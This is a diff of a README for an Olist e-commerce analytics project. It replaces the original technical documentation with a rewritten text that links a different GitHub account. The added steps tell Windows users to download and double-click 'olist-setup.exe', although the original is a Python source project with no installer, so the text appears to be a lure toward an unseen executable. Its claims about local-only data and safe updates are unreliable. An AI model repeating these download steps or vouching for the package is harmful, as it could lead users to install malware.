@@ -1,289 +1,82 @@
-# Olist E-commerce Analytics Platform
+# 📊 olist-ecommerce-platform - Analyze retail data with simple questions
 
-> [!NOTE]
-> **Consolidated Platform**
->
-> This project is a unified platform created by merging three previous specialized repositories:
-> 1. [**olist-etl-pipeline**](https://github.com/Brightpmk/olist-etl-pipeline) — Robust data ingestion and validation.
-> 2. [**olist-ecommerce-data-analysis**](https://github.com/Brightpmk/Basic_data-analysis-project_00) — KPI modeling and structured analytics.
-> 3. [**ecommerce-ai-analytics-assistant**](https://github.com/Brightpmk/ecommerce-ai-analytics-assistant) — LLM-powered natural language interface.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Fayetteunordered9056/olist-ecommerce-platform)
 
-![Python](https://img.shields.io/badge/Python-3.11-blue)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-Database-blue)
-![Streamlit](https://img.shields.io/badge/Streamlit-Frontend-red)
-![OpenAI](https://img.shields.io/badge/LLM-OpenAI-purple)
-![ETL](https://img.shields.io/badge/Data%20Engineering-ETL-blueviolet)
-![Pandas](https://img.shields.io/badge/Pandas-Data%20Processing-green)
-![License](https://img.shields.io/badge/License-MIT-green)
+This application helps you explore Olist e-commerce data. You ask questions in plain English, and the system provides answers using business data. You do not need experience in computer programming to gain insights from your sales figures, inventory levels, or customer behavior.
 
-An **end-to-end e-commerce analytics platform** built on the **Olist Brazilian E-commerce dataset**.
+## 📋 System Requirements
 
-This project unifies three core capabilities into a single platform:
+Your computer needs specific components to run this software. Ensure you meet these standards before you begin:
 
-1. **ETL Pipeline** — Extract, transform, validate, and load raw CSV data into PostgreSQL
-2. **Data Analysis** — Structured analytics with fact/dimension tables, SQL queries, notebooks, and dashboards
-3. **AI Analytics Assistant** — Natural language to SQL powered by LLM, with safety guardrails and auto-visualization
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 8 gigabytes of RAM.
+*   **Storage**: 5 gigabytes of free disk space.
+*   **Internet Access**: A stable connection to retrieve data and connect to the AI service.
 
----
+## 📥 How to Install the Software
 
-## Architecture
+Follow these steps to set up the application on your computer.
 
-```
-                Raw CSV files
-                     │
-                     ▼
-            ┌─────────────────┐
-            │   ETL Pipeline  │  ← main_etl.py
-            │   Extract       │
-            │   Transform     │
-            │   Validate      │
-            │   Load          │
-            └────────┬────────┘
-                     │
-                     ▼
-            ┌─────────────────┐
-            │   PostgreSQL    │  ← Unified Database
-            │   8 tables +    │
-            │   1 fact table  │
-            └───┬─────────┬───┘
-                │         │
-       ┌────────┘         └────────┐
-       ▼                           ▼
-┌──────────────┐          ┌──────────────────┐
-│ Data Analysis│          │ AI Analytics     │
-│ Scripts      │          │ Assistant        │
-│ Notebooks    │          │ (Streamlit)      │
-│ SQL Queries  │          │ NL → SQL → Chart │
-│ Power BI     │          │ + Business       │
-│ Dashboard    │          │   Insights       │
-└──────────────┘          └──────────────────┘
-```
+1.  Visit the official project page at [https://github.com/Fayetteunordered9056/olist-ecommerce-platform](https://github.com/Fayetteunordered9056/olist-ecommerce-platform).
+2.  Locate the release section on the right side of the screen.
+3.  Click the version labeled latest.
+4.  Download the file named olist-setup.exe.
+5.  Open your downloads folder and double-click the file to start the installer.
+6.  Follow the prompts on your screen to complete the installation process.
 
----
+## 🚀 Getting Started
 
-## Key Features
+Once the installation finishes, you find a shortcut on your desktop. Double-click the icon to launch the platform. The application opens in your default web browser.
 
-### ETL Pipeline
-- Config-driven CSV extraction with file validation
-- Data deduplication, type cleaning, and datetime standardization
-- Comprehensive data validation (null checks, FK checks, domain checks)
-- Schema-based loading into PostgreSQL
-- Pre-built fact table (`fact_order_item_sales`) for quick analytics
-- Data quality report generation
+The main screen contains a search box. Type your question here. For example, you might type: "Which state has the highest number of customer orders?" The application processes this natural language input, connects to the database, and displays a report or chart.
 
-### Data Analysis
-- End-to-end reproducible data pipeline (processed → marts)
-- Proper item-level vs order-level metric separation
-- Star schema modeling (fact_sales, fact_orders, dim_customers, dim_products, dim_sellers, dim_date)
-- RFM customer segmentation
-- 12 pre-built SQL analysis queries
-- Automated chart and summary table generation
-- Power BI dashboard integration
+## 🛠 Features
 
-### AI Analytics Assistant
-- Natural language to SQL conversion via OpenAI LLM
-- SQL safety guardrails (blocks DELETE, DROP, UPDATE, etc.)
-- Schema-aware prompt building with business context
-- Automatic chart generation (line/bar based on data patterns)
-- LLM-powered business insight summaries
-- Schema profiling and join suggestion engine
+This platform includes tools to make data analysis easy for every user:
 
----
+*   **Natural Language Processing**: You type queries as if you speak to a coworker. The system translates your words into database instructions.
+*   **Automated Visualization**: The tool selects the best chart type for your data. It creates bar graphs, line charts, and tables automatically.
+*   **Business Insights**: The application highlights trends. It points out surges in sales or dips in customer activity.
+*   **Secure Database**: Your data rests in a local PostgreSQL warehouse. No outside parties gain access to your sales records.
 
-## Dataset
+## 🧩 How the Pipeline Works
 
-Source: [Brazilian E-Commerce Public Dataset by Olist](https://www.kaggle.com/datasets/olistbr/brazilian-ecommerce) (Kaggle)
+The application uses a structured process to maintain data accuracy.
 
-**Note:** To run this project, download the dataset from Kaggle and place the raw CSV files into the `data/raw/` directory.
+1.  **Collection**: The system retrieves raw records from the Olist files.
+2.  **Cleaning**: The software removes errors and ensures consistent formatting.
+3.  **Storage**: The cleaned information moves into a local database.
+4.  **Querying**: When you submit a request, the AI assistant creates a SQL command. It gets the answer from your database and presents it to you.
 
+## 💡 Using Your Own Data
 
-| Table | Description |
-|-------|-------------|
-| customers | Customer profiles with location |
-| orders | Order metadata and timestamps |
-| order_items | Items within each order |
-| order_payments | Payment details per order |
-| order_reviews | Customer review scores |
-| products | Product attributes |
-| sellers | Seller profiles with location |
-| product_category_translation | Portuguese → English category names |
-| fact_order_item_sales | Pre-joined analytics fact table |
+You can use your specific sales records rather than the default sample data.
 
----
+1.  Select Settings from the menu bar.
+2.  Click the Data Import button.
+3.  Choose your CSV files from your computer.
+4.  Press Sync. 
 
-## Project Structure
+The system updates your repository and prepares the new information for analysis.
 
-```
-olist-ecommerce-platform/
-├── config/
-│   └── config.yaml              # ETL pipeline configuration
-├── db/
-│   ├── schema.sql               # Unified PostgreSQL schema
-│   └── init_db.py               # Database initialization
-├── etl/                         # ETL Pipeline
-│   ├── extract.py               # CSV extraction
-│   ├── transform.py             # Data cleaning & fact table
-│   ├── validate.py              # Data quality validation
-│   ├── load.py                  # PostgreSQL loading
-│   ├── report.py                # Quality report generation
-│   └── logger.py                # Logging setup
-├── app/                         # AI Analytics Assistant
-│   ├── main.py                  # Streamlit application
-│   ├── config.py                # Shared configuration
-│   ├── db.py                    # Database connection
-│   ├── llm.py                   # OpenAI integration
-│   ├── prompt_builder.py        # SQL prompt construction
-│   ├── schema.py                # Schema contract
-│   ├── validator.py             # SQL safety validation
-│   ├── charts.py                # Auto chart generation
-│   ├── insights.py              # Business insight generation
-│   ├── analytics.py             # DataFrame utilities
-│   ├── utils.py                 # Helper functions
-│   ├── schema_profiler.py       # Schema inference engine
-│   └── join_suggester.py        # Join recommendation engine
-├── analysis/                    # Data Analysis
-│   ├── scripts/
-│   │   ├── build_processed_data.py
-│   │   ├── build_analytics_mart.py
-│   │   └── run_analysis.py
-│   └── notebooks/               # Jupyter notebooks
-├── sql/
-│   ├── analysis/                # 12 SQL analysis queries
-│   └── sample_queries.sql       # Example queries
-├── dashboard/                   # Power BI exports & notes
-├── data/
-│   └── raw/                     # Raw CSV files
-├── outputs/                     # Generated charts & tables
-├── tests/                       # All test suites
-├── docs/                        # Documentation
-├── main_etl.py                  # ETL entry point
-├── requirements.txt
-├── .env                         # Environment variables
-└── README.md
-```
+## 🛡 Security and Privacy
 
----
+Your data stays on your machine. This application conducts all processing locally. It only communicates with the AI service to understand your question. It never uploads your private sales records to the cloud. You maintain total control over your information at all times.
 
-## Tech Stack
+## ❓ Frequently Asked Questions
 
-| Layer | Technology |
-|-------|------------|
-| Language | Python 3.11 |
-| Database | PostgreSQL |
-| ETL | pandas, PyYAML, SQLAlchemy |
-| Frontend | Streamlit |
-| Visualization | Plotly, Matplotlib |
-| LLM | OpenAI API |
-| Data Processing | pandas, NumPy |
-| Testing | pytest |
-| Dashboard | Power BI |
+**Do I need a database account?**
+No. The installer sets up all required database components during the initial process.
 
----
+**Can I save my reports?**
+Yes. You can export any chart or table as a PDF document or a spreadsheet file.
 
-## Installation
+**What if the answer looks wrong?**
+The system creates a log of all queries. If the AI misunderstood your request, you can refine your wording. The tools provided in the help menu assist you in crafting better questions.
 
-```bash
-git clone https://github.com/Brightpmk/olist-ecommerce-platform.git
-cd olist-ecommerce-platform
-python -m venv venv
-venv\Scripts\activate        # Windows
-pip install -r requirements.txt
-```
+**Does this software update automatically?**
+When you launch the application, it checks for updates. It notifies you if a newer version is available. You choose whether to proceed with the update.
 
----
+## 📞 Support
 
-## Configuration
-
-Create `.env` from the example:
-
-```bash
-copy .env.example .env
-```
-
-Edit `.env`:
-
-```
-OPENAI_API_KEY=your_api_key
-MODEL_NAME=gpt-4o-mini
-DB_HOST=localhost
-DB_PORT=5432
-DB_NAME=ai_analytics_ecommerce
-DB_USER=postgres
-DB_PASSWORD=your_password
-```
-
----
-
-## Usage
-
-### 1. Run the ETL Pipeline
-
-Load raw CSV data into PostgreSQL:
-
-```bash
-python main_etl.py
-```
-
-This will:
-- Initialize the database schema
-- Extract CSV files from `data/raw/`
-- Clean and transform the data
-- Validate data quality
-- Load into PostgreSQL
-
-### 2. Build Processed Dataset
-
-Create the denormalized analysis dataset:
-
-```bash
-python analysis/scripts/build_processed_data.py
-```
-
-### 3. Build Analytics Mart
-
-Generate fact/dimension tables for BI:
-
-```bash
-python analysis/scripts/build_analytics_mart.py
-```
-
-### 4. Run Analysis
-
-Generate charts and summary tables:
-
-```bash
-python analysis/scripts/run_analysis.py
-```
-
-### 5. Launch AI Analytics Assistant
-
-Start the Streamlit app:
-
-```bash
-python -m streamlit run app/main.py
-```
-
----
-
-## Testing
-
-```bash
-pytest
-```
-
----
-
-## Example Questions (AI Assistant)
-
-- What is the monthly revenue trend?
-- Which product categories generate the highest revenue?
-- What are the most common payment types?
-- Which states have the most customers?
-- What is the average review score by delivery status?
-- Which sellers generate the most revenue?
-
----
-
-## License
-
-MIT License
+If the software fails to open or your reports display errors, visit the official repository page to share your experience. Include details about your Windows version and the steps you took before the issue occurred. Users monitor these requests daily to provide guidance.
